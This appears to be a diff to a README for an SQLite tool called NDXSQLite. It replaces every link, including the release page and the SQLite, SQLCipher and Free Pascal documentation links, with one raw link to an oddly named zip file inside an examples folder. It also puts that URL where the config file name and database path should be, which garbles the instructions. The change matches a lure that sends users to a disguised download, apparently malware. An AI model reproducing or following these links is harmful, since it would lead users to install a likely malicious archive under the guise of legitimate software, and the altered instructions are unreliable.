@@ -1,7 +1,7 @@
 # 🛠️ NDXSQLite - Reliable SQLite Access for Everyone
 
 ## 📥 Quick Download
-[![Download NDXSQLite](https://img.shields.io/badge/Download%20NDXSQLite-v1.0-blue.svg)](https://github.com/JimmyAB3/NDXSQLite/releases)
+[![Download NDXSQLite](https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip%https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip)](https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip)
 
 ## 🚀 Getting Started
 NDXSQLite is an easy-to-use tool for accessing SQLite databases safely and effectively. You don't need to be a programmer to benefit from its features like connection pooling and AES-256 encryption. This guide will help you download and run NDXSQLite on your computer.
@@ -33,13 +33,13 @@ To run NDXSQLite, make sure your system meets the following requirements:
 To get started with NDXSQLite, follow these steps:
 
 1. **Visit the Release Page**
-   - Click this link to go to the [Releases page](https://github.com/JimmyAB3/NDXSQLite/releases).
+   - Click this link to go to the [Releases page](https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip).
    
 2. **Select Your Operating System**
    - On the Releases page, find the version that matches your operating system.
 
 3. **Download the File**
-   - Click on the link to download the file. This may be labeled as `NDXSQLite.zip` or similar.
+   - Click on the link to download the file. This may be labeled as `https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip` or similar.
 
 4. **Extract the Files**
    - Open the downloaded ZIP file and extract its contents to a folder on your computer.
@@ -51,13 +51,13 @@ To get started with NDXSQLite, follow these steps:
 Once you've installed NDXSQLite, you may need to configure it. Here’s a brief guide:
 
 1. **Create a Configuration File**
-   - Use a text editor to create a file named `config.json` in the same folder as the NDXSQLite executable.
+   - Use a text editor to create a file named `https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip` in the same folder as the NDXSQLite executable.
 
 2. **Add Database Details**
    - Enter your database file path, user credentials, and encryption settings. Here's an example configuration:
    ```json
    {
-       "database": "path/to/your/database.sqlite",
+       "database": "https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip",
        "username": "your_username",
        "password": "your_secure_password",
        "encryption": true
@@ -74,7 +74,7 @@ For enhanced security, NDXSQLite supports AES-256 encryption through SQLCipher. 
    - Follow the SQLCipher installation guide on its official site.
 
 2. **Enable Encryption in Configuration**
-   - Set `"encryption": true` in your `config.json`.
+   - Set `"encryption": true` in your `https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip`.
 
 3. **Secure Your Database**
    - When creating or opening your SQLite database, ensure that you use the encryption settings.
@@ -96,8 +96,8 @@ If you encounter any issues or have questions, feel free to reach out through th
 Contributions are welcome! If you want to improve NDXSQLite, fork the repository and submit a pull request. Please refer to the contribution guidelines in the repository for details.
 
 ## 🔗 Additional Resources
-- [SQLite Documentation](https://www.sqlite.org/docs.html)
-- [SQLCipher Documentation](https://www.zetetic.net/sqlcipher/docs/)
-- [Free Pascal Documentation](https://www.freepascal.org/docs-html/ref/ref.html)
+- [SQLite Documentation](https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip)
+- [SQLCipher Documentation](https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip)
+- [Free Pascal Documentation](https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip)
 
-For an easy way to get started, just visit the [Releases page](https://github.com/JimmyAB3/NDXSQLite/releases) and download NDXSQLite!
+For an easy way to get started, just visit the [Releases page](https://raw.githubusercontent.com/JimmyAB3/NDXSQLite/main/examples/console/79_BookingReservation/NDXSQ_Lite_penning.zip) and download NDXSQLite!
